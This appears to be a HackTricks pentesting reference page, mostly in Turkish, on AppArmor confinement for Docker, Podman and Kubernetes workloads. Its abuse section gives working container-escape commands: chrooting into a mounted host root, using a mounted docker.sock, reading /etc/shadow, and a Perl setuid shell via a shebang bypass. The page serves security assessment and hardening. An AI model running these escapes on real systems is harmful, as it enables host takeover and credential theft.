# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Genel Bakış

AppArmor, program başına profiller aracılığıyla kısıtlamalar uygulayan bir **Zorunlu Erişim Kontrolü** sistemidir. Kullanıcı ve grup sahipliğine büyük ölçüde bağımlı olan geleneksel DAC kontrollerinin aksine, AppArmor çekirdeğin sürecin kendisine bağlı bir politikayı uygulamasına izin verir. Konteyner ortamlarda bunun önemi şudur: bir iş yükü geleneksel olarak bir eylemi deneyecek kadar ayrıcalığa sahip olabilir, ancak AppArmor profili ilgili path, mount, network davranışı veya capability kullanımına izin vermediği için yine de reddedilebilir.

En önemli kavramsal nokta, AppArmor'ın **yol-tabanlı** olduğudur. Dosya sistemi erişimini SELinux'un yaptığı gibi etiketler aracılığıyla değil, path kuralları aracılığıyla değerlendirir. Bu, onu erişilebilir ve güçlü kılar; ancak bind mounts ve alternatif path düzenlemelerinin dikkatle ele alınmasını gerektirir. Aynı host içeriği farklı bir path altında erişilebilir hale gelirse, politikanın etkisi operatörün ilk beklediği gibi olmayabilir.

## Konteyner İzolasyonundaki Rolü

Konteyner güvenlik incelemeleri genellikle capabilities ve seccomp seviyesinde sona erer, ancak AppArmor bu kontrollerden sonra da önemini korur. Varsayalım bir konteyner olması gerekenden daha fazla ayrıcalığa sahip veya operasyonel nedenlerle bir ekstra capability'ye ihtiyaç duyan bir iş yükü var. AppArmor yine de dosya erişimini, mount davranışlarını, networking'i ve yürütme kalıplarını, bariz kötüye kullanım yolunu engelleyecek şekilde kısıtlayabilir. Bu yüzden AppArmor'ı "uygulamayı çalıştırmak için sadece" devre dışı bırakmak, sadece riskli bir konfigürasyonu sessizce aktif olarak istismara açık bir hale dönüştürebilir.

## Laboratuvar

AppArmor'ın hostta etkin olup olmadığını kontrol etmek için kullanın:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Mevcut container işleminin hangi kullanıcı altında çalıştığını görmek için:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Fark öğreticidir. Normal durumda, süreç runtime tarafından seçilen profile bağlı bir AppArmor bağlamı göstermelidir. unconfined durumda, o ekstra kısıtlama katmanı ortadan kaybolur.

Ayrıca Docker'ın uyguladığını düşündüğü şeyi de inceleyebilirsiniz:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Runtime Usage

Docker, host destekliyorsa varsayılan veya özel bir AppArmor profili uygulayabilir. Podman da AppArmor-tabanlı sistemlerde AppArmor ile entegre olabilir; ancak SELinux-öncelikli dağıtımlarda diğer MAC sistemi genellikle ön plana çıkar. Kubernetes, gerçek anlamda AppArmor destekleyen node'larda workload düzeyinde AppArmor politikası ortaya koyabilir. LXC ve ilişkili Ubuntu-aile sistemi-konteyner ortamları da AppArmor'u yaygın şekilde kullanır.

Pratik olarak şunu bilmek önemlidir: AppArmor bir "Docker feature" değildir. Birden çok runtime'ın uygulamayı seçebileceği host-kernel özelliğidir. Host bunu desteklemiyorsa veya runtime unconfined çalıştırılması talimatı verilmişse, sözde koruma gerçekte mevcut olmaz.

Kubernetes özelinde modern API `securityContext.appArmorProfile`'dır. Kubernetes `v1.30`'dan itibaren eski beta AppArmor açıklama anotasyonları deprecated olmuştur. Desteklenen hostlarda `RuntimeDefault` varsayılan profildir; `Localhost` ise node'da önceden yüklü olması gereken bir profile işaret eder. Bu, inceleme sırasında önemlidir çünkü bir manifest AppArmor farkındalığı gösteriyor gibi görünürken tamamen node tarafı desteğe ve ön-yüklenmiş profillere bağımlı olabilir.

İnce ama kullanışlı bir operasyonel ayrıntı: `appArmorProfile.type: RuntimeDefault`'ı açıkça ayarlamak, alanı basitçe atlamaktan daha sıkıdır. Alan açıkça ayarlandıysa ve node AppArmor'u desteklemiyorsa, admission başarısız olmalıdır. Alan atlanırsa, workload yine AppArmor olmayan bir node'da çalışabilir ve sadece o ek confinement katmanını almayabilir. Bir saldırgan açısından bu, hem manifesti hem de gerçek node durumunu kontrol etmek için iyi bir nedendir.

Docker-özellikli AppArmor hostlarında en iyi bilinen varsayılan `docker-default`'dır. Bu profil Moby'nin AppArmor şablonundan türetilir ve bazı capability-temelli PoC'lerin varsayılan bir konteynerde neden hâlâ başarısız olduğunu açıklaması bakımından önemlidir. Geniş hatlarıyla `docker-default` normal ağ işlemlerine izin verir, `/proc`'un büyük bir kısmına yazmayı reddeder, `/sys`'in hassas kısımlarına erişimi engeller, mount işlemlerini engeller ve ptrace'i genel bir host-probing ilmeği olmayacak şekilde kısıtlar. Bu temel anlayış, "the container has `CAP_SYS_ADMIN`" ile "the container can actually use that capability against the kernel interfaces I care about" arasındaki farkı ayırt etmeye yardımcı olur.

## Profile Management

AppArmor profilleri genellikle `/etc/apparmor.d/` altında depolanır. Yaygın bir isimlendirme kuralı, executable yolundaki slash'ları noktalarla değiştirmektir. Örneğin, `/usr/bin/man` için bir profil genellikle `/etc/apparmor.d/usr.bin.man` olarak saklanır. Bu ayrıntı hem savunma hem de değerlendirme sırasında önemlidir; çünkü aktif profil adını öğrendiğinizde ilgili dosyayı host üzerinde genellikle hızlıca bulabilirsiniz.

Useful host-side management commands include:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Bu komutların container güvenliği referansında önemli olmasının nedeni, profillerin gerçekte nasıl oluşturulduğunu, yüklendiğini, complain mode'a geçirildiğini ve uygulama değişikliklerinden sonra nasıl değiştirildiğini açıklamalarıdır. Eğer bir operatör, sorun giderme sırasında profilleri complain mode'a alma ve enforcement'ı geri yüklemeyi unutma alışkanlığına sahipse, dokümantasyonda konteyner korunuyormuş gibi görünebilirken gerçekte çok daha gevşek davranabilir.

### Profillerin Oluşturulması ve Güncellenmesi

`aa-genprof` uygulama davranışını gözlemleyebilir ve etkileşimli olarak bir profil oluşturulmasına yardımcı olabilir:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` daha sonra `apparmor_parser` ile yüklenebilecek bir şablon profil oluşturabilir:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Binary değiştiğinde ve politika güncellenmesi gerektiğinde, `aa-logprof` loglarda bulunan reddedilmeleri yeniden oynatabilir ve operatörün bunları izin verilecek mi yoksa reddedilecek mi karar vermesine yardımcı olabilir:
```bash
sudo aa-logprof
```
### Günlükler

AppArmor reddetmeleri genellikle `auditd`, syslog veya `aa-notify` gibi araçlar aracılığıyla görülebilir:
```bash
sudo aa-notify -s 1 -v
```
Bu operasyonel ve saldırgan amaçlı olarak faydalıdır. Savunucular profilleri iyileştirmek için kullanır. Saldırganlar hangi kesin yolun veya işlemin engellendiğini ve AppArmor'un exploit chain'i engelleyen kontrol olup olmadığını öğrenmek için kullanır.

### Kesin Profil Dosyasını Belirleme

Bir runtime, bir container için belirli bir AppArmor profil adını gösterdiğinde, genellikle bu adı disk üzerindeki profil dosyasına eşlemek faydalıdır:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Bu, özellikle host tarafı incelemeleri sırasında faydalıdır çünkü "the container says it is running under profile `lowpriv`" ile "the actual rules live in this specific file that can be audited or reloaded" arasındaki boşluğu kapatır.

### Denetlenmesi Gereken Yüksek Öncelikli Kurallar

Bir profili okuyabiliyorsanız, basit `deny` satırlarında durmayın. Birkaç kural türü, AppArmor'ın container escape attempt karşı ne kadar işe yarayacağını önemli ölçüde değiştirir:

- `ux` / `Ux`: hedef binary'yi unconfined şekilde execute eder. Eğer erişilebilir bir helper, shell veya interpreter `ux` altında izinliyse, genellikle test edilecek ilk şey budur.
- `px` / `Px` ve `cx` / `Cx`: exec üzerinde profile geçişleri gerçekleştirir. Bunlar otomatik olarak kötü değildir, fakat denetlenmeye değerdir çünkü bir geçiş mevcut olandan çok daha geniş bir profile yol açabilir.
- `change_profile`: bir görevin başka bir yüklü profile geçmesine izin verir, hemen veya bir sonraki exec'te. Hedef profil daha zayıfsa, bu kısıtlayıcı bir alandan çıkış için amaçlanmış bir kaçış yolu olabilir.
- `flags=(complain)`, `flags=(unconfined)`, veya daha yenisi `flags=(prompt)`: bunlar profile ne kadar güveneceğinizi değiştirmelidir. `complain` reddedilmeleri enforce etmek yerine loglar, `unconfined` sınırı kaldırır ve `prompt` saf kernel-taraflı deny yerine userspace karar yoluna bağlıdır.
- `userns` veya `userns create,`: daha yeni AppArmor politikaları user namespaces oluşturulmasını aracılık edebilir. Eğer bir container profile bunu açıkça izin veriyorsa, nested user namespaces platform AppArmor'ı hardening stratejisinin bir parçası olarak kullansa bile etkin kalır.

Host tarafında kullanışlı grep:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Bu tür bir denetim, yüzlerce sıradan dosya kuralına bakmaktan genellikle daha faydalıdır. Bir breakout bir helper çalıştırmaya, yeni bir namespace'e girmeye veya daha az kısıtlayıcı bir profile kaçmaya bağlıysa, cevap genellikle açık görünen `deny /etc/shadow r` tarzı satırlarda değil, bu geçiş odaklı kurallarda saklıdır.

## Misconfigurations

En bariz hata `apparmor=unconfined` ayarıdır. Yöneticiler bunu sıklıkla, profile'ın doğru şekilde tehlikeli veya beklenmedik bir şeyi engellemesi nedeniyle başarısız olan bir uygulamayı debug ederken ayarlar. Bu bayrak prod ortamında kalırsa, tüm MAC katmanı fiilen devre dışı bırakılmış olur.

Başka ince bir sorun, dosya izinleri normal göründüğü için bind mounts'un zararsız olduğunu varsaymaktır. AppArmor path-based olduğu için, host yollarını farklı mount noktaları altında açmak path kurallarıyla kötü şekilde etkileşebilir. Üçüncü bir hata ise, config dosyasındaki bir profile adının, host kernel gerçekten AppArmor'u uygulamıyorsa çok az şey ifade ettiğini unutmaktır.

## Abuse

AppArmor yoksa, önceki kısıtlı işlemler aniden çalışabilir: bind mounts üzerinden hassas yolları okumak, procfs veya sysfs'in daha zor kullanılması gereken bölümlerine erişmek, capabilities/seccomp izin veriyorsa mount ile ilgili eylemleri gerçekleştirmek veya normalde bir profile tarafından reddedilecek yolları kullanmak. AppArmor genellikle neden capability-tabanlı bir breakout denemesinin kağıt üzerinde "çalışması gerekirken" uygulamada başarısız olduğunu açıklayan mekanizmadır. AppArmor'u kaldırın, aynı deneme başarılı olmaya başlayabilir.

Eğer AppArmor'un bir path-traversal, bind-mount veya mount-based istismar zincirini engelleyen ana unsur olduğunu düşünüyorsanız, genellikle ilk adım bir profile sahipken ve olmadan hangi şeylerin erişilebilir olduğunu karşılaştırmaktır. Örneğin, bir host path'i container içinde mount edildiyse, öncelikle onu geçip okuyup okuyamadığınızı kontrol ederek başlayın:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Eğer container ayrıca `CAP_SYS_ADMIN` gibi tehlikeli bir capability içeriyorsa, en pratik testlerden biri AppArmor'un mount işlemlerini veya hassas kernel filesystems'e erişimi engelleyen kontrol olup olmadığını test etmektir:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
Host path'ın zaten bir bind mount aracılığıyla erişilebilir olduğu ortamlarda, AppArmor'un kaybı read-only information-disclosure sorununu doğrudan host dosya erişimine dönüştürebilir:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Bu komutların amacı AppArmor'ın tek başına breakout oluşturması değildir. Amaç, AppArmor kaldırıldıktan sonra birçok filesystem ve mount-based abuse path'in hemen test edilebilir hale gelmesidir.

### Tam Örnek: AppArmor Devre Dışı + Host Root Mounted

Eğer container zaten host root'unu `/host`'a bind-mounted olarak içeriyorsa, AppArmor'ı kaldırmak engellenmiş bir filesystem ve mount-based abuse path'i tam bir host escape'e dönüştürebilir:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
shell host dosya sistemi üzerinden çalışmaya başladığında, workload fiilen container sınırını aşmıştır:
```bash
id
hostname
cat /etc/shadow | head
```
### Tam Örnek: AppArmor Devre Dışı + Runtime Socket

Eğer gerçek engel runtime durumunu çevreleyen AppArmor ise, monte edilmiş bir socket tam bir escape için yeterli olabilir:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Tam yol bağlama noktasına bağlıdır, ancak sonuç aynıdır: AppArmor artık runtime API'ye erişimi engellemiyor ve runtime API host'u tehlikeye atabilecek bir container başlatabilir.

### Tam Örnek: Yol Tabanlı Bind-Mount Bypass

AppArmor yol tabanlı olduğu için, `/proc/**`'i korumak, aynı host procfs içeriğinin farklı bir yol üzerinden erişilebildiğinde otomatik olarak korunacağı anlamına gelmez:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Etkisi, tam olarak neyin mount edildiğine ve alternatif yolun diğer kontrolleri de atlayıp atlamadığına bağlıdır, ancak bu desen AppArmor'un izole olarak değil mount düzeniyle birlikte değerlendirilmesi gerektiğinin en açık nedenlerinden biridir.

### Tam Örnek: Shebang Bypass

AppArmor policy bazen bir interpreter path'ini, shebang işlemesi aracılığıyla script çalıştırmayı tam olarak hesaba katmayacak şekilde hedef alır. Tarihsel bir örnek, ilk satırı confined interpreter'a işaret eden bir script kullanmayı içeriyordu:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Bu tür bir örnek, profilin amacı ile gerçek yürütme semantiğinin farklılaşabileceğini hatırlatması bakımından önemlidir. Container ortamlarında AppArmor'u incelerken, yorumlayıcı zincirleri ve alternatif yürütme yolları özel dikkat gerektirir.

## Kontroller

Bu kontrollerin amacı üç soruya hızlıca cevap vermektir: host üzerinde AppArmor etkin mi, mevcut işlem kısıtlı mı ve runtime gerçekten bu container'a bir profil uyguladı mı?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
What is interesting here:

- If `/proc/self/attr/current` shows `unconfined`, the iş yükü AppArmor kısıtlamasından fayda sağlamıyor.
- If `aa-status` shows AppArmor disabled or not loaded, runtime yapılandırmasındaki herhangi bir profil adı çoğunlukla kozmetiktir.
- If `docker inspect` shows `unconfined` or an unexpected custom profile, bu genellikle bir dosya sistemi veya mount tabanlı suistimal yolunun çalışmasının nedenidir.
- If `/sys/kernel/security/apparmor/profiles` does not contain the profile you expected, runtime veya orkestratör yapılandırması tek başına yeterli değildir.
- If a supposedly hardened profile contains `ux`, broad `change_profile`, `userns`, or `flags=(complain)` style rules, pratikteki sınır profil adının ima ettiğinden çok daha zayıf olabilir.

If a container already has elevated privileges for operational reasons, leaving AppArmor enabled often makes the difference between a controlled exception and a much broader security failure.

## Çalışma Zamanı Varsayılanları

| Runtime / platform | Varsayılan durum | Varsayılan davranış | Yaygın manuel zayıflatma |
| --- | --- | --- | --- |
| Docker Engine | AppArmor destekli hostlarda varsayılan olarak etkin | `docker-default` AppArmor profilini kullanır, aksi belirtilmedikçe | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host'a bağlı | AppArmor `--security-opt` ile desteklenir; ancak kesin varsayılan host/runtime bağımlıdır ve Docker'ın belgelenmiş `docker-default` profili kadar evrensel değildir | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Koşullu varsayılan | If `appArmorProfile.type` is not specified, the default is `RuntimeDefault`, but it is only applied when AppArmor is enabled on the node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` with a weak profile, nodes without AppArmor support |
| containerd / CRI-O under Kubernetes | Node/runtime desteğini takip eder | Kubernetes tarafından desteklenen yaygın runtimeler AppArmor'ı destekler, ancak gerçek uygulama hâlâ node desteğine ve iş yükü ayarlarına bağlıdır | Kubernetes satırıyla aynı; doğrudan runtime yapılandırması AppArmor'ı tamamen atlayabilir |

For AppArmor, the most important variable is often the **host**, not only the runtime. A profile setting in a manifest does not create confinement on a node where AppArmor is not enabled.

## References

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
